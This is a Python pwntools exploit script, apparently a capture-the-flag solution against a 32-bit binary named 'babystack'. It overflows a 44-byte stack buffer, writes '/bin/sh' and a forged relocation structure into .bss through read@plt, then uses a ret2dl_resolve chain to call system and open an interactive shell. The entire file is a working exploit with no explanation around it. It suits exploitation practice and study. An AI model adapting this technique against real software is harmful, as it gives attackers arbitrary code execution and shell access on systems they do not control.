#coding:utf-8
import sys
import roputils
from pwn import *

offset = 44
readplt = 0x08048300
bss = 0x0804a020
vulFunc = 0x0804843B

p = process('./babystack')
# p = remote('202.120.7.202', 6666)
# context.log_level = 'debug'

def getReloc(elf, base):
    jmprel = elf.dynamic('JMPREL')
    relent = elf.dynamic('RELENT')

    addr_reloc, padlen_reloc = elf.align(base, jmprel, relent)
    reloc_offset = addr_reloc - jmprel
    return reloc_offset

rop = roputils.ROP('./babystack')
addr_bss = rop.section('.bss')

# step1 : write sh & resolve struct to bss
buf1 = 'A' * offset #44
buf1 += p32(readplt) + p32(vulFunc) + p32(0) + p32(addr_bss) + p32(100)
p.send(buf1)

buf2 =  rop.string('/bin/sh')
buf2 += rop.fill(20, buf2)
buf2 += rop.dl_resolve_data(addr_bss+20, 'system')
buf2 += rop.fill(100, buf2)
p.send(buf2)

#step2 : use dl_resolve_call get system & system('/bin/sh')
buf3 = 'A'*44 + rop.dl_resolve_call(addr_bss+20, addr_bss)
p.send(buf3)
p.interactive()